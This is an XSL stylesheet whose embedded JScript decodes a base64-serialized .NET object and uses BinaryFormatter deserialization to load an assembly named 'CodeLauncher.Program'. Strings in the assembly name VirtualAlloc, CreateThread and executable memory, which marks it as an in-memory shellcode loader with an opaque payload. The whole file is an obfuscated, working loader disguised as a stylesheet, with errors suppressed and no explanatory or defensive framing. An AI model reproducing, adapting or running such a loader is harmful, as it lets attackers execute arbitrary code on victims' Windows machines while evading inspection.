<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
        var enc = new ActiveXObject("System.Text.ASCIIEncoding");
        var length = enc.GetByteCount_2(b);
        var ba = enc.GetBytes_4(b);
        var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
        ba = transform.TransformFinalBlock(ba, 0, length);
        var ms = new ActiveXObject("System.IO.MemoryStream");
        ms.Write(ba, 0, (length / 4) * 3);
        ms.Position = 0;
        return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAO0yMWwAAAAAA"+
"AAAA4AACIQsBCwAADAAAAAYAAAAAAADeKwAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAjCsA"+
"AE8AAAAAQAAAmAIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAADkCwAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAmAIAAABA"+
"AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAMArAAAAAAAASAAAAAIABQAwJAAAXAcAAAMAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA"+
"KAIAAAYAACoAAAAAAAAAunqUw6Db0dl0JPRbMcmxyzFTEwNTE4PrhnY2Gq6/l8yThDGGD/GcVIZI"+
"5KpOv+aaejwG3rh/QzlaOqfUbaZM3mrkHm7eufwpX3bk1/UcoZHh0FsQ0/KYXxY8CRY47eUd6MgJ"+
"zxPNGcQUK2f3WfRgO0h5Pb0nOUmyISnRPWRMbCC2DyJqio7bP581CFYqbbOouRgiPlUfgJEuIOMn"+
"SasrDA+gEumFP2VZ2J7QDqlDcpEm08kXaAKMv7QGPBKCJWvQ7lCGRdNmNFdZI4kta1AoBQIaJlB1"+
"o+rFGhhAL8Ci/smnc2YaQX+MtMJkokShOfBCVce9Klh6zyWAfs3q1xdsA9bzF+c95SvMoIJ+yUUI"+
"luQjV+GJhaZsSn7VnvzeGpGOkMnF3Cm9gt8aDysr51cbLK1wJM6O5djbcSOFDoC0dRFMqc2ZnFJS"+
"VSmc7F00IiJNclUQfKi+Y5UewrJOg+ICNgzGLXO9UvMjQJI+wyX3B88ve/8Lb+HlczT72+VO8jLS"+
"+IIvAWg4jsWU7zrXoyeaq3TpE8T+hy6MkSDM0xPMyYMmvD6+8aFuNyejudQUyWUdMTrgAlBZ3NSB"+
"c53gW7+qn1ASmuZU3scRYQnM6NukdVH4r2H1kJgstcdyFo9idXG5kUQcJePICHK6RlIqrjfdm1Ev"+
"LvoUcWiUpe//ZnpOYNgQn56m+iJjYzUUKvbeW5f2kyHLJS/f4c654QsXwa7dgDrpDILYZ/H8Itlm"+
"k2Ic557fz6/wGYWOYAZGok+z3+NLvKCl4dc+juWfBMJ5Y/L9YMAd8MhgBzzm0avExUam+rivbqHG"+
"t0zMyb5viERJvrSbw8QPohukNa3aQevW9eGOIBkv5zCHIRsfpEa0t3sRurQXtBjHPOQ5BDuwdPhU"+
"kOLrek23uhjNLqw2Mur31ByzrYnbcFs+c/YCZr6RrAxORxU78HiB4/t4FTFomQahJ1Frm0ydPmTq"+
"Bt2l7onrk0vJvtP30yCmjNrLrt8UFr/NOjISUuyHTrOWpM5yqsgbMS4sQbxt7NqFcB6xpIOl6YlY"+
"Gjmv3nmD7qHDar8sQq0a5Htbxt1wHwRIQhLasY0eDPzQTS9ZxunGC8NNY13/zosWiedHMaMTMAYA"+
"ZQAAAAEAABEAIEQDAACNBgAAASXQAwAABCgGAAAKChYGjml+AQAABH4CAAAEKAMAAAYLBhYHbigH"+
"AAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMoBAAABgwIFSgFAAAGJisAKkogABAA"+
"AIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAABgAgAAI34A"+
"AMwCAABEAwAAI1N0cmluZ3MAAAAAEAYAAAgAAAAjVVMAGAYAABAAAAAjR1VJRAAAACgGAAA0AQAA"+
"I0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAADwAAAAQAAAADAAAABgAAAAwAAAAL"+
"AAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAABAAAAAQAAAAAACgABAAAAAAAGADkA"+
"MgAGAEkBLQEGAGUBLQEGAJQBdAEGALQBdAEGANgBMgAGACICdAEGAD0CMgAGAHkCdAEGAIgCMgAG"+
"AI4CMgAGALECMgAGAOMCxAIGAPUCxAIGACgDGAMAAAAAAQAAAAAAAQABAAEAEAAUABwABQABAAEA"+
"AAAAAN0BAAAFAAMABwATAQAARwIAACEABAAHABEASwASABEAVgASABMBZQI+AFAgAAAAAIYYQAAK"+
"AAEArCMAAAAAkQBGAA4AAQAAAAAAgACRIG0AFQABAAAAAACAAJEgegAdAAUAAAAAAIAAkSCHACgA"+
"CwAdJAAAAACRGBEDDgANAAAAAQCbAAAAAgCnAAAAAwCsAAAABAC9AAAAAQDHAAAAAgDaAAAAAwDm"+
"AAAABAD1AAAABQD7AAAABgALAQAAAQAWAQAAAgAeAREAQAAuACEAQAA0ACkAQAAKAAkAQAAKADkA"+
"QAAKAEkAoQJCAGEAuAJKAGkA6wJPAGEA8AJYAHEAQABkAHkAQAAKACcAWwA5AC4AEwBpAC4AGwBy"+
"AGMAKwA5AAgABgCRAAEARAMAAAQAWwAIAwABBwBtAAEAAAEJAHoAAQAAAQsAhwABAGggAAADAASA"+
"AAAAAAAAAAAAAAAAAAAAANIBAAAEAAAAAAAAAAAAAAABACkAAAAAAAQAAwAAAAA8TW9kdWxlPgBj"+
"b2RlMi5kbGwAUHJvZ3JhbQBDb2RlTGF1bmNoZXIAbXNjb3JsaWIAU3lzdGVtAE9iamVjdAAuY3Rv"+
"cgBNYWluAE1FTV9DT01NSVQAUEFHRV9FWEVDVVRFX1JFQURXUklURQBWaXJ0dWFsQWxsb2MAQ3Jl"+
"YXRlVGhyZWFkAFdhaXRGb3JTaW5nbGVPYmplY3QAbHBTdGFydEFkZHIAc2l6ZQBmbEFsbG9jYXRp"+
"b25UeXBlAGZsUHJvdGVjdABscFRocmVhZEF0dHJpYnV0ZXMAZHdTdGFja1NpemUAbHBTdGFydEFk"+
"ZHJlc3MAcGFyYW0AZHdDcmVhdGlvbkZsYWdzAGxwVGhyZWFkSWQAaEhhbmRsZQBkd01pbGxpc2Vj"+
"b25kcwBTeXN0ZW0uU2VjdXJpdHkuUGVybWlzc2lvbnMAU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmli"+
"dXRlAFNlY3VyaXR5QWN0aW9uAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGls"+
"YXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBj"+
"b2RlMgBCeXRlADxQcml2YXRlSW1wbGVtZW50YXRpb25EZXRhaWxzPntCQkQ3MTI5OC1GNDlDLTRC"+
"RjAtQUE4QS1FMTY4OEI5Mzc1NDl9AENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAFZhbHVlVHlw"+
"ZQBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTgzNgAkJG1ldGhvZDB4NjAwMDAwMi0xAFJ1bnRp"+
"bWVIZWxwZXJzAEFycmF5AFJ1bnRpbWVGaWVsZEhhbmRsZQBJbml0aWFsaXplQXJyYXkASW50UHRy"+
"AG9wX0V4cGxpY2l0AFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBNYXJzaGFsAENvcHkA"+
"WmVybwBEbGxJbXBvcnRBdHRyaWJ1dGUAa2VybmVsMzIALmNjdG9yAFN5c3RlbS5TZWN1cml0eQBV"+
"bnZlcmlmaWFibGVDb2RlQXR0cmlidXRlAAAAAAMgAAAAAACYEte7nPTwS6qK4WiLk3VJAAi3elxW"+
"GTTgiQMgAAEDAAABAgYJBwAECQkJCQkKAAYYCQkJGAkQCQUAAgkYCQUgAQERDQQgAQEIBAEAAAAD"+
"BhEQBwACARIpES0EAAEYCggABAEdBQgYCAIGGAgHBR0FCRgJGAQgAQEOCAEACAAAAAAAHgEAAQBU"+
"AhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAYCeLgGAhFN5c3RlbS5TZWN1cml0eS5QZXJtaXNzaW9u"+
"cy5TZWN1cml0eVBlcm1pc3Npb25BdHRyaWJ1dGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAs"+
"IEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORUBVAIQU2tp"+
"cFZlcmlmaWNhdGlvbgEAAAC0KwAAAAAAAAAAAADOKwAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"wCsAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIAAQAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"+
"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAA8AgAAAAAAAAAAAAA8AjQAAABW"+
"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAAAAAAAAAAAAAAAAAAA"+
"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"+
"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEnAEAAAEAUwB0AHIAaQBuAGcA"+
"RgBpAGwAZQBJAG4AZgBvAAAAeAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE"+
"AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A"+
"AAAAADAALgAwAC4AMAAuADAAAAA0AAoAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAGMAbwBk"+
"AGUAMgAuAGQAbABsAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAADwA"+
"CgABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABjAG8AZABlADIALgBkAGwAbAAA"+
"ADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAA4AAgA"+
"AQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAOA7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"+
"ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'CodeLauncher.Program';

try {
        setversion();
        var stm = base64ToStream(serialized_obj);
        var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
        var al = new ActiveXObject('System.Collections.ArrayList');
        var d = fmt.Deserialize_2(stm);
        al.Add(undefined);
        var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);

} catch (e) {
    debug(e.message);
}
]]> </ms:script>
</stylesheet>
